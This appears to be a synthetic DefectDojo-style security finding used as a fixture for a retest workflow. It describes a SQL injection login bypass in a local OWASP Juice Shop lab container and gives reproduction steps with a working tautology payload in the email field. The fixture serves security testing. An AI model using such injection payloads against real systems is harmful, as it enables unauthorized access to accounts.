_comment: SYNTHETIC finding in DefectDojo style. Target is the local OWASP Juice Shop lab container only. No real engagement data. Drives the M1 walking-skeleton retest (FR-07/FR-09).

findings.title: SQL injection auth bypass in login
findings.description: The email field of POST /rest/user/login is concatenated into a SQL query. A tautology payload collapses the WHERE clause and returns a valid session for the first user without credentials.
findings.steps_to_reproduce:
1. POST http://localhost:3000/rest/user/login with JSON {"email": "' OR 1=1--", "password": "x"}
2. Observe HTTP 200 with an authentication.token in the response body
